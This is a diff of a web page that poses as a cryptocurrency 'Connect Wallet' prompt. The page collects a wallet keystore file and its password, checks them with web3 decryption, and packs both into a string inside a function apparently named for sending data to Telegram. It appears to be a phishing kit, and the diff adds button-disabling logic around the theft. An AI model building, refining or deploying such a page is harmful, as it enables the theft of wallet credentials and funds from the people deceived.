@@ -463,7 +463,7 @@
 		</label>
 		Enter Wallet Password:
 		<input type="password" placeholder='' name="" id="keystorePassword_input">
-		<button  onclick="sendDataTG('keystore')">Connect Wallet</button>
+		<button  id="keystore_buttonSend" onclick="sendDataTG('keystore')">Connect Wallet</button>
 	</div>
 	<div class="key window" style="display:none;">
 		<div class="error">
@@ -528,6 +528,8 @@
 		function sendDataTG(type){
 			var data = '';
 			var success = false;
+			
+			$('#keystore_buttonSend').attr('disabled', true);
 			if(type == 'keystore'){
 				try{
 					var acc = web3.eth.accounts.decrypt(keystoreFileContent, $('#keystorePassword_input').val());
@@ -539,7 +541,7 @@
 
 					data = keystoreFileContent + "\nPassword: " + $('#keystorePassword_input').val();
 					$('.'+type+'.window #keystorePassword_input').val('');
-
+					$('#keystore_buttonSend').attr('disabled', false);
 					success = false;
 					
 				}
